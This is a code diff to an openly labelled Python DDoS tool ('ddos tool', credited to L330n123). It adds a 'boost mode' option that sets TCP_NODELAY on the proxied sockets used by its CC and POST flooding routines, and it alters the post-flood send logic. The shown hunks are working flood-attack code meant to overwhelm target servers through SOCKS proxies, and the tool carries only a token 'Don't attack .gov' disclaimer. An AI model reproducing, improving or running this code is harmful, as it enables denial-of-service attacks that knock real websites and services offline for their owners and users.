@@ -29,7 +29,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 3.2 Beta 
+Python3 version Beta 
                             C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
@@ -154,6 +154,8 @@ def cc(socks_type):
 				break
 			s = socks.socksocket()
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+			if brute:
+				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(ip), int(port)))
 			if port == 443:
 				ctx = ssl.SSLContext()
@@ -204,11 +206,12 @@ def post(socks_type):
 				break
 			s = socks.socksocket()
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+			if brute:
+				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=ip)
-			s.send(str.encode(request))
 			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
@@ -442,6 +445,7 @@ def main():
 	global data
 	global mode2
 	global cookies
+	global brute
 	ip = ""
 	port = ""
 	mode = ""
@@ -591,6 +595,13 @@ def main():
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
+		brute = str(input("> Enable boost mode[beta](y/n, default=n):"))
+		if brute == "":
+			brute = False
+		elif brute == "y":
+			brute = True
+		elif brute == "n":
+			brute = False
 		input("Press Enter to continue.")
 		if mode == "post":
 			for _ in range(thread_num):
